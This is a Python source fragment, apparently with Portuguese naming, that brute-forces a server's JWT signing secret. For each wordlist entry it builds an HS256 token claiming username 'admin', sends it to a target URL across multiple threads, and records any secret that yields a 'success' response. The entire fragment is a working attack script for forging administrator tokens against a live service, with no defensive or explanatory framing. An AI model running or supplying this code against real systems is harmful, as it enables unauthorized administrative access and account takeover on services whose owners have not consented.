def gerar_headers(secret):
    nonce = str(random.randint(100000, 999999))
    timestamp = str(int(time.time() * 1000))
    x_request_id = str(uuid.uuid4())

    jwt_header = {
        "alg": "HS256",
        "typ": "JWT"
    }
    payload = {
        "username": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }

    header_b64 = base64.urlsafe_b64encode(json.dumps(jwt_header).encode()).decode().rstrip("=")
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    signing_input = f"{header_b64}.{payload_b64}"
    signature = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    ).decode().rstrip("=")
    jwt_token = f"{signing_input}.{signature}"

    headers = HEADERS_TEMPLATE.copy()
    headers.update({
        "Auth": jwt_token,
        "X-Request-Id": x_request_id,
        "X-Timestamp": timestamp,
        "X-Nonce": nonce
    })
    return headers

def testar_segredo(secret):
    headers = gerar_headers(secret)
    payload = "logout=true"
    try:
        response = client.post(TARGET_URL, headers=headers, content=payload)
        status = response.status_code
        if status == 200 and "success" in response.text:
            log_success(secret, response.text)
            save_valid_key(secret)
            return True
        else:
            log_attempt(secret, status)
            save_tested_word(secret)
            return False
    except Exception as e:
        log_attempt(secret, f"error: {e}")
        return False

def worker(queue):
    while True:
        try:
            secret = queue.pop()
        except IndexError:
            break
        testar_segredo(secret)

def iniciar_forca_bruta():
    queue = list(wordlist)
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(queue,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

